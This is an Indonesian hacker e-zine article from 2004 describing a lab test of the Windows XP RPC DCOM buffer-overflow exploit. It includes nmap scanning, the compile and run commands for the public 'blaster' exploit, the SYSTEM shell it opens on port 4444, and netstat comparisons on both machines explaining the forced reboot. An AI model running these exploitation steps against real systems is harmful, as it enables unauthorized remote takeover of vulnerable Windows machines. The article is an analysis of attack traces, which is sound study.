@@ -1,0 +1,370 @@
+
+	____________________   ___ ___ ________
+	\_   _____/\_   ___ \ /   |   \\_____  \
+	 |    __)_ /    \  \//    ~    \/   |   \
+	 |        \\     \___\    Y    /    |    \
+	/_______  / \______  /\___|_  /\_______  /
+	        \/         \/       \/         \/
+
+
+					    .OR.ID
+ECHO-ZINE RELEASE
+       05
+
+Author: y3dips || y3dips@echo.or.id || y3d1ps@telkom.net
+Online @ www.echo.or.id :: http://ezine.echo.or.id
+
+
+== EKSPLOITASI RPC pada windows ==
+
+
+PERIPHERAL :
+
+ 1. komputer ber-OS windows XP service pack 1 ; IP address 192.168.1.1
+ 2. laptop ber-OS fedora 1 (yarrow) ; IP address 192.168.1.131
+ 3. cross cable , UnShielded Twisted Pair , dengan rj45
+
+
+[eksploitasi pertama]
+
+	[pada linux yarrow : 192.168.1.131]
+
+	pertama-tama kita scan dulu pc target alias windows yang akan kita
+	eksploitasi, dapat menggunakan nmap di linux
+
+	[root@localhost root]# nmap 192.168.1.5
+
+	Starting nmap 3.48 ( http://www.insecure.org/nmap/ ) at 2004-03-23 23:00 WIT
+	Interesting ports on 192.168.1.5:
+	(The 1652 ports scanned but not shown below are in state: closed)
+	PORT     STATE SERVICE
+	135/tcp  open  msrpc
+	139/tcp  open  netbios-ssn
+	445/tcp  open  microsoft-ds
+	1025/tcp open  NFS-or-IIS
+	5000/tcp open  UPnP
+
+	hm ternyata port 135 ; alias msrpc terbuka :D
+	siapa tau bisa di ekploitasi rpcnya :D
+
+	pake sploits rpc, atau blastercode (terdapat di di ezine#1)
+	yang diambil dari www.metsaploit.com
+
+	compile dulu :D
+
+	[root@localhost umum]# gcc -o blaster blaster.c
+	[root@localhost umum]# ./blaster
+	---------------------------------------------------------
+	- Remote DCOM RPC Buffer Overflow Exploit
+	- Original code by FlashSky and Benjurry
+	- Rewritten by HDM <hdm [at] metasploit.com>
+	- Usage: ./blaster <Target ID> <Target IP>
+	- Targets:
+	-          0    Windows 2000 SP0 (english)
+	-          1    Windows 2000 SP1 (english)
+	-          2    Windows 2000 SP2 (english)
+	-          3    Windows 2000 SP3 (english)
+	-          4    Windows 2000 SP4 (english)
+	-          5    Windows XP SP0 (english)
+	-          6    Windows XP SP1 (english)
+
+	[root@localhost umum]# ./blaster 6 192.168.1.5
+	---------------------------------------------------------
+	- Remote DCOM RPC Buffer Overflow Exploit
+	- Original code by FlashSky and Benjurry
+	- Rewritten by HDM <hdm [at] metasploit.com>
+	- Using return address of 0x77e626ba
+	- Dropping to System Shell...
+
+	Microsoft Windows XP [Version 5.1.2600]
+	(C) Copyright 1985-2001 Microsoft Corp.
+
+	C:\WINDOWS\system32>
+
+
+	kita masuk ke mesin target :D, mo ngapain aja juga bisa :D
+	baca artikel terkait soal ini :D
+
+	[pada pc target : windows xp : 192.168.1.1]
+
+	saat di eksploitasi apa yang terjadi , coba jalankan netstat
+
+	Microsoft(R) Windows DOS
+	(C)Copyright Microsoft Corp 1990-2001.
+
+	C:\DOCUME~1\Y3DIPS>netstat -ano
+
+	Active Connections
+
+  	Proto  Local Address          Foreign Address        State           PID
+  	TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       780 <<---
+  	TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+  	TCP    0.0.0.0:1025           0.0.0.0:0              LISTENING       828<servis rpc lainnya
+  	TCP    0.0.0.0:1028           0.0.0.0:0              LISTENING       4
+  	TCP    0.0.0.0:4444           0.0.0.0:0              LISTENING       780 <<---
+ 	TCP    0.0.0.0:5000           0.0.0.0:0              LISTENING       920
+  	TCP    192.168.1.5:139        0.0.0.0:0              LISTENING       4
+  	TCP    192.168.1.5:4444       192.168.1.131:32798    ESTABLISHED     780 <<--look at here!
+  	UDP    0.0.0.0:135            *:*                                    780 <<--
+  	UDP    0.0.0.0:445            *:*                                    4
+  	UDP    0.0.0.0:500            *:*                                    612
+  	UDP    0.0.0.0:1026           *:*                                    892
+  	UDP    0.0.0.0:1027           *:*                                    828<servis rpc lainnya
+  	UDP    0.0.0.0:1032           *:*                                    828<servis rpc lainnya
+  	UDP    127.0.0.1:123          *:*                                    828<servis rpc lainnya
+  	UDP    127.0.0.1:1900         *:*                                    920
+  	UDP    192.168.1.5:123        *:*                                    828<servis rpc lainnya
+  	UDP    192.168.1.5:137        *:*                                    4
+  	UDP    192.168.1.5:138        *:*                                    4
+  	UDP    192.168.1.5:1900       *:*                                    920
+
+	bandingkan dengan sebelum adanya eksploitasi :P
+
+	C:\DOCUME~1\Y3DIPS>netstat -ano
+
+	Active Connections
+
+ 	Proto  Local Address          Foreign Address        State           PID
+  	TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       800
+	TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+  	TCP    0.0.0.0:1025           0.0.0.0:0              LISTENING       824
+  	TCP    0.0.0.0:1029           0.0.0.0:0              LISTENING       4
+  	TCP    0.0.0.0:5000           0.0.0.0:0              LISTENING       980
+	UDP    0.0.0.0:135            0.0.0.0:0              LISTENING       800
+	UDP    0.0.0.0:445            *:*                                    4
+  	UDP    0.0.0.0:500            *:*                                    644
+  	UDP    0.0.0.0:1026           *:*                                    824
+  	UDP    127.0.0.1:123          *:*                                    834
+  	UDP    127.0.0.1:1900         *:*                                    980
+
+	lihatlah bedanya :P
+
+	[keterangan]
+
+	penambahan process id yaitu 780 dengan melibatkan port 135 dan 4444 pada pc target
+	dan 32798 pada pc penyerang dalam hal ini ip 192.168.1.131
+
+================================================================================================
+
+[eksploitasi kedua]
+
+	cara yang digunakan sama, dengan catatan pc target harus di restart agar bisa di
+	eksploitasi ulang, kenapa bisa begini? kok cuma satu kali ?
+	nanti akan kita jawab di bawah :D
+
+	[pc target]
+
+	eksploitasi ke 2
+
+	Microsoft(R) Windows DOS
+	(C)Copyright Microsoft Corp 1990-2001.
+
+	C:\DOCUME~1\Y3DIPS>netstat -ano
+
+	Active Connections
+
+  	Proto  Local Address          Foreign Address        State           PID
+  	TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       772<<--look at here!
+  	TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+  	TCP    0.0.0.0:1025           0.0.0.0:0              LISTENING       820<servis rpc lainnya
+  	TCP    0.0.0.0:1028           0.0.0.0:0              LISTENING       4
+  	TCP    0.0.0.0:4444           0.0.0.0:0              LISTENING       772<<--look at here!
+  	TCP    0.0.0.0:5000           0.0.0.0:0              LISTENING       1044
+  	TCP    192.168.1.5:139        0.0.0.0:0              LISTENING       4
+  	TCP    192.168.1.5:4444       192.168.1.131:32800    ESTABLISHED     772<<--look at here!
+  	UDP    0.0.0.0:135            *:*                                    772<<--look at here!
+  	UDP    0.0.0.0:445            *:*                                    4
+  	UDP    0.0.0.0:500            *:*                                    612
+  	UDP    0.0.0.0:1026           *:*                                    820<servis rpc lainnya
+  	UDP    0.0.0.0:1027           *:*                                    996
+  	UDP    0.0.0.0:1032           *:*                                    820<servis rpc lainnya
+  	UDP    127.0.0.1:123          *:*                                    820<servis rpc lainnya
+  	UDP    127.0.0.1:1900         *:*                                    1044
+  	UDP    192.168.1.5:123        *:*                                    820<servis rpc lainnya
+  	UDP    192.168.1.5:137        *:*                                    4
+  	UDP    192.168.1.5:138        *:*                                    4
+  	UDP    192.168.1.5:1900       *:*                                    1044
+
+	[pc penyerang a.k.a 192.168.1.131]
+
+	[root@localhost root]# netstat -ap
+	Active Internet connections (servers and established)
+	Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+	tcp        0      0 *:32770                 *:*                     LISTEN      1382/rpc.statd
+	tcp        0      0 *:pop3s                 *:*                     LISTEN      2085/xinetd
+	tcp        0      0 *:mysql                 *:*                     LISTEN      2122/mysqld
+	tcp        0      0 *:pop3                  *:*                     LISTEN      2085/xinetd
+	tcp        0      0 *:sunrpc                *:*                     LISTEN      1361/portmap
+	tcp        0      0 *:http                  *:*                     LISTEN      2151/httpd
+	tcp        0      0 192.168.1.131:domain    *:*                     LISTEN      2059/named
+	tcp        0      0 localhost.locald:domain *:*                     LISTEN      2059/named
+	tcp        0      0 *:ssh                   *:*                     LISTEN      2073/sshd
+	tcp        0      0 localhost.localdom:rndc *:*                     LISTEN      2059/named
+	tcp        0      0 *:https                 *:*                     LISTEN      2151/httpd
+	tcp        0      0 192.168.1.131:32800     192.168.1.5:krb524      ESTABLISHED 2767/blaster<<--look at here!
+	udp        0      0 *:32768                 *:*                                 1382/rpc.statd
+	udp        0      0 *:32769                 *:*                                 2059/named
+	udp        0      0 192.168.1.131:domain    *:*                                 2059/named
+	udp        0      0 localhost.locald:domain *:*                                 2059/named
+	udp        0      0 *:710                   *:*                                 1382/rpc.statd
+	udp        0      0 *:sunrpc                *:*                                 1361/portmap
+	Active UNIX domain sockets (servers and established)
+
+	---sisanya di potong----karena menyangkut internal system---gak perlu banget-----
+
+
+	lihat nama program yang kita eksekusi membuka hubungan ke pc target
+	:)
+
+	[keterangan]
+
+	lihatlah port yang terbuka di pc target ,tetap merupakan port 135 dan 4444
+	sedangkan untuk koneksi ke pc penyerang portnya menjadi 32800;
+	lihat processID pada target juga berubah (ini lumrah) tapi lihat PID
+	tersebut tetap membuat 3 koneksi yang persis sama kecuali port pada penyerang
+
+	*tujuan eksploitasi ke 2 adalah membandingkan dari kedua pc , baik penyerang
+	dan targetnya.
+
+
+
+C:\DOCUME~1\Y3DIPS>
+
+====================================================================================================
+
+
+eksploitasi ke 3
+
+Microsoft(R) Windows DOS
+(C)Copyright Microsoft Corp 1990-2001.
+
+C:\DOCUME~1\Y3DIPS>netstat -ano
+
+Active Connections
+
+  Proto  Local Address          Foreign Address        State           PID
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       780 <<--look at here!
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:1025           0.0.0.0:0              LISTENING       828<servis rpc lainnya
+  TCP    0.0.0.0:1028           0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:4444           0.0.0.0:0              LISTENING       780 <<--look at here!
+  TCP    0.0.0.0:5000           0.0.0.0:0              LISTENING       968
+  TCP    192.168.1.5:139        0.0.0.0:0              LISTENING       4
+  TCP    192.168.1.5:4444       192.168.1.131:32802    ESTABLISHED     780 <<--look at here!
+  UDP    0.0.0.0:135            *:*                                    780 <<--look at here!
+  UDP    0.0.0.0:445            *:*                                    4
+  UDP    0.0.0.0:500            *:*                                    612
+  UDP    0.0.0.0:1026           *:*                                    904
+  UDP    0.0.0.0:1027           *:*                                    828<servis rpc lainnya
+  UDP    0.0.0.0:1032           *:*                                    828<servis rpc lainnya
+  UDP    127.0.0.1:123          *:*                                    828<servis rpc lainnya
+  UDP    127.0.0.1:1900         *:*                                    968
+  UDP    192.168.1.5:123        *:*                                    828<servis rpc lainnya
+  UDP    192.168.1.5:137        *:*                                    4
+  UDP    192.168.1.5:138        *:*                                    4
+  UDP    192.168.1.5:1900       *:*                                    968
+
+C:\DOCUME~1\Y3DIPS>
+
+ disini terlihat kalau port yang di buka pada pc target adalah port 4444,
+ kesimpulan ini kita dapat dari hipotesa kita selam 3 kali :D
+
+ tetapi bukan itu saja , apabila kita mempunyai kodenya maka kita akan tau
+ kalo memang port ini yang di gunakan untuk melakukan koneksi (catatan
+ port ini tidak berlaku general, alias terserah pembuat program untuk
+ menggunakan port berapapun untuk membind shell :P )
+
+
+ [hal yang unik]
+
+ pada ujicoba menggunakan sploits ini terdapat hal yang unik, yaitu pada
+ saat akan memutuskan koneksi ke remote pc (pc target) maka otomatis pc
+ target akan di shutdon! , mengapa begitu ?  baca aja terus .. :D
+
+
+====================================================================================
+
+ [pc attacker; pada saat eksekusi sploits dan pemutusan koneksi]
+
+[root@localhost umum]# ./blaster 6 192.168.1.5
+---------------------------------------------------------
+- Remote DCOM RPC Buffer Overflow Exploit
+- Original code by FlashSky and Benjurry
+- Rewritten by HDM <hdm [at] metasploit.com>
+- Using return address of 0x77e626ba
+- Dropping to System Shell...
+
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\WINDOWS\system32>exit
+exit
+
+ - Read failure
+
+=====================================================================================
+
+  [pc target saat koneksi di putuskan oleh attacker]
+
+
+  pada pc target akan muncul message box yang isinya seperti berikut ini
+
+       --------------------------------------------------
+       | this system is shutting down. please save      |
+       | all work in progress and log off. any unsaved  |
+       | changes will be lost. this shutdown initiadted |
+       | by NT Authority\system                         |
+       |================================================|
+       |       time before shutdown :00 :00 :60         |
+       |================================================|
+       |  windows must restart because the rpc service  |
+       |             terminated unexpectly              |
+       --------------------------------------------------
+
+
+       Timer tersebut akan menghitung mundur sampai 0 dan melakukan shutdown pada pc
+       target. target dapat membatalkan shutdown tersebut dengan cara mengetikkan
+       shutdown -a pada command prompt . Tetapi bukan ini yang kita bahas, yang
+       kita bahas adalah kenapa itu bisa terjadi?
+
+       ternyata setelah di cek pada processes di windows task manager ,mendapatkan
+       hasil sbb:
+
+       svchost pada windows task manager yang sebelum di eksploitasi terdapat 5 buah
+       (tentunya ini sudah terserang)
+
+       apabila koneksi diputuskan oleh attacker maka akan segera mengakhiri processnya,
+       (svchost) inilah yang membuat komputer atau pc tersebut menjadi restart
+       (untuk jelasnya anda dapat membaca artikel terkait di ezine ini juga tentang
+       pentingnya rpc bagi windows :: berjudul 'securing windows XP')
+
+
+       [kesimpulan]
+
+       semakin anda tahu semakin anda waspada, itulah yang kita harapkan
+
+       contoh ini tidak akan mengeneralisasi semua eksploit RPC, tetapi kebanyakan
+       memiliki tanda tanda yang sama :D , aku baru mencoba 2 sploits ;1 untuk windows
+       yaitu KAHT2 dan dari linux adalah Remote DCOM RPC Buffer Overflow Exploit ini;
+
+       *untuk cara cara menanggulangi eksploitasi pada RPC DCOM kami melakukan
+       beberapa ujicoba juga, dan dapat dibaca di artikel lain di ezine ini juga :D
+
+
+       EOF;
+
+       :) ini artikel windows terakhir buatanku di ezine ini, aku hanya berusaha
+       memenuhi permintaan teman teman kepada kami selaku echostaff :D
+       semoga artikel ini sedikit banyak dapat memberi manfaat bagi kita semua.
+
+
+*greetz to:
+	[echostaff a.k.a moby, the_day, comex ,z3r0byt3], echo memberz,
+        anak anak newbie_hacker,$peci@l temen2 seperjuangan
+
+	kirimkan kritik && saran ke y3dips[at]echo.or.id
+
+	*/0x79/0x33/0x64/0x69/0x70/0x73/* (c)2004
+
+
+
